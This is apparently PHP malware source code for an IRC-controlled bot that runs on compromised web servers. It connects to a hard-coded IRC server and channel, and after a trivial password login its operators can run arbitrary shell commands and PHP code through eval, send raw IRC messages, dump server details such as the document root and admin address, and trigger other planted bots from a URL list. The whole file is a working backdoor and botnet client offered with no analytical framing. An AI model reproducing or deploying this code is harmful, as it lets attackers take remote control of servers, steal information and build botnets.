<?php
error_reporting(0);
set_time_limit(0);

class BotScanner
{
	var $config = array("server"=>"irc.oltreirc.net",
						"port"=>6667,
						"pass"=>"�", //
						"nick"=>"Loader",
						"maxrand"=>6,
						"chan"=>"#nosvfull",
						"key"=>"�", //
						"modes"=>"+p",
						"password"=>"123",  //
						"trigger"=>".",
						"hostauth"=>"*" // *
						);

	var $users = array();

	function start()
	{
		do {
			$this->conn = fsockopen($this->config['server'],$this->config['port'],$e,$s,30);
		} while (!$this->conn);

		$ident = "";
		$alph = range("a","z");

		for($i=0;$i<$this->config['maxrand'];$i++)
			$ident .= $alph[rand(0,25)];

		if(strlen($this->config['pass'])>0)
			$this->send("PASS ".$this->config['pass']);

		$this->send("USER $ident 127.0.0.1 localhost :$ident");
		$this->set_nick();
		$this->main();
	}

	function main()
	{
		while(!feof($this->conn))
		{
			$this->buf = trim(fgets($this->conn,512));
			$cmd = explode(" ",$this->buf);
			if(substr($this->buf,0,6)=="PING :")
			{
				$this->send("PONG :".substr($this->buf,6));
			}
			if(isset($cmd[1]) && $cmd[1] =="001")
			{
				$this->send("MODE ".$this->nick." ".$this->config['modes']);
				$this->join($this->config['chan'],$this->config['key']);
			}
			if(isset($cmd[1]) && $cmd[1]=="433")
			{
				$this->set_nick();
			}
			if($this->buf != $old_buf)
			{
				$mcmd = array();
				$msg = substr(strstr($this->buf," :"),2);
				$msgcmd = explode(" ",$msg);
				$nick = explode("!",$cmd[0]);
				$vhost = explode("@",$nick[1]);
				$vhost = $vhost[1];
				$nick = substr($nick[0],1);
				$host = $cmd[0];

				if($msgcmd[0]==$this->nick)
				{
					for($i=0;$i<count($msgcmd);$i++)
						$mcmd[$i] = $msgcmd[$i+1];
				}
				else
				{
					for($i=0;$i<count($msgcmd);$i++)
						$mcmd[$i] = $msgcmd[$i];
				}

				if(count($cmd)>2)
				{
					switch($cmd[1])
					{
						case "QUIT":
							if($this->is_logged_in($host))
							{
								$this->log_out($host);
							}
							break;

						case "PART":
							if($this->is_logged_in($host))
							{
								$this->log_out($host);
							}
							break;

						case "PRIVMSG":
							if(!$this->is_logged_in($host) && ($vhost == $this->config['hostauth'] || $this->config['hostauth'] == "*"))
							{
								if(substr($mcmd[0],0,1)==".")
								{
									switch(substr($mcmd[0],1))
									{
										case "user":
											if($mcmd[1]==$this->config['password'])
											{
												$this->privmsg($this->config['chan'],"[\2PASSWORD\2]: $nick Password accepted. You are Logged in");
												$this->log_in($host);
											}
											else
											{
												$this->privmsg($this->config['chan'],"[\2PASSWORD\2]: The Password Entered was incorect from $nick");
											}
											break;
									}
								}
							}
							elseif($this->is_logged_in($host))
							{
								if(substr($mcmd[0],0,1)==".")
								{
									switch(substr($mcmd[0],1))
									{
										case "restart":
											$this->send("QUIT :restart");
											fclose($this->conn);
											$this->start();
											break;

										case "dns":
											if(isset($mcmd[1]))
											{
												$ip = explode(".",$mcmd[1]);
												if(count($ip)==4 && is_numeric($ip[0]) && is_numeric($ip[1]) && is_numeric($ip[2]) && is_numeric($ip[3]))
												{
													$this->privmsg($this->config['chan'],"[\2DNS\2]: ".$mcmd[1]." => ".gethostbyaddr($mcmd[1]));
												}
												else
												{
													$this->privmsg($this->config['chan'],"[\2DNS\2]: ".$mcmd[1]." => ".gethostbyname($mcmd[1]));
												}
											}
											break;

										case "info":
											$this->privmsg($this->config['chan'],"[\2INFO\2]: [\2httpd\2: ".$_SERVER['SERVER_SOFTWARE']."] [\2docroot\2: ".$_SERVER['DOCUMENT_ROOT']."] [\2domain\2: ".$_SERVER['SERVER_NAME']."] [\2admin\2: ".$_SERVER['SERVER_ADMIN']."] [\2url\2:".$_SERVER['REQUEST_URI']."]");
											break;
										case "cmd":
											if(isset($mcmd[1]))
											{
												$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
												$this->privmsg($this->config['chan'],"[\2cmd\2]: $command");
												$pipe = popen($command,"r");

												while(!feof($pipe))
												{
													$pbuf = trim(fgets($pipe,512));
													if($pbuf != NULL)
														$this->privmsg($this->config['chan'],"     : $pbuf");
												}

												pclose($pipe);
											}
											break;
											case "rndnick":
												$this->set_nick();
												break;
											case "raw":
												$this->send(strstr($msg,$mcmd[1]));
												break;
											case "php":
												$eval = eval(substr(strstr($msg,$mcmd[1]),strlen($mcmd[1])));
												break;
											case "exec": break;
												$command = substr(strstr($msg,$mcmd[0]),strlen($mcmd[0])+1);
												$exec = shell_exec($command);
												$ret = explode("\n",$exec);
												$this->privmsg($this->config['chan'],"[\2EXEC\2]: $command");
												for($i=0;$i<count($ret);$i++)
												{
													if($ret[$i]!=NULL)
													{
														$this->privmsg($this->config['chan'],"      : ".trim($ret[$i]));
													}
												}
												break;
											case "die":
													$this->send("QUIT :die command from $nick");
													fclose($this->conn);
													exit;
												case "logout":
													$this->log_out($host);
													$this->privmsg($this->config['chan'],"[\2PASSWORD\2]: $nick You have been logged out");
													break;
											case "load":
												$list = file($mcmd[1]);
					                            $this->privmsg($this->config['chan'], "[\2LOADING\2]: \2".count($list)." bot(s) to load.\2");

					                            $wokeup = 0;
					                            $ignored = 0;
					                            $failed = 0;

					                            foreach ($list as $key => $value)
					                            {

						                            $rawUrl = trim($value);
													$params = preg_split(",^(http://|https://|ftp://)?([^/]+)(.+)$,i", $rawUrl, -1, PREG_SPLIT_DELIM_CAPTURE);

													$host = $params[2];
													$path = $params[3];

													if ("/".$_SERVER['PHP_SELF'] == $path || "" == $host || "" == $path)
													{
														$ignored++;
														continue;
													}

													$timeout = isset($mcmd[2]) ? $mcmd[2] : 5;
													$sock = @fsockopen($host, 80, $errno, $errstr, 2);

													if (!$sock)
													{
														$failed++;
														$this->privmsg($this->config['chan'], "[\2LOADING\2]:[".($key+1)."] \2Failed.\2 [{$host}]");
													}
													else
													{
														if (!stream_set_blocking($sock, 0))
														{
															$this->privmsg($this->config['chan'], "[\2LOADING\2]:[".($key+1)."] $host doesn't support stream_set_blocking()");
															fclose($sock);
															continue;
														}

														$out = "GET ".$path." HTTP/1.1\r\n";
													    $out .= "Host: $host\r\n";
													    $out .= "Connection: Close\r\n\r\n";
													    fwrite($sock, $out);
													    // $this->privmsg($this->config['chan'], "[\2LOADING\2]:[".($key+1)."] \2Good Morning..\2 [$host]");
													    $wokeup++;

													    fclose($sock);
													}
												}

												$this->privmsg($this->config['chan'], "[\2LOADING\2]: \2{$wokeup} Suceeded | {$failed} Failed | {$ignored} Dupes ignored\2");
												break;
									}
								}
							}
					break;
					}
				}
			}
			$old_buf = $this->buf;
		}

		$this->start();
	}
	function send($msg)
	{
		fwrite($this->conn,"$msg\r\n");
	}
	function join($chan,$key=NULL)
	{
		$this->send("JOIN $chan $key");
	}
	function privmsg($to,$msg)
	{
		$this->send("PRIVMSG $to :$msg");
	}
	function is_logged_in($host)
	{
		if(isset($this->users[$host]))
			return 1;
		else
			return 0;
	}
	function log_in($host)
	{
		$this->users[$host] = true;
	}
	function log_out($host)
	{
		unset($this->users[$host]);
	}
	function set_nick()
	{
		$this->nick = $this->config["nick"]."[";
		for($i=0;$i<$this->config['maxrand'];$i++)
			$this->nick .= mt_rand(0,9);

		$this->send("NICK ".$this->nick."]");
	}
}

$bot = new BotScanner;
$bot->start();
?>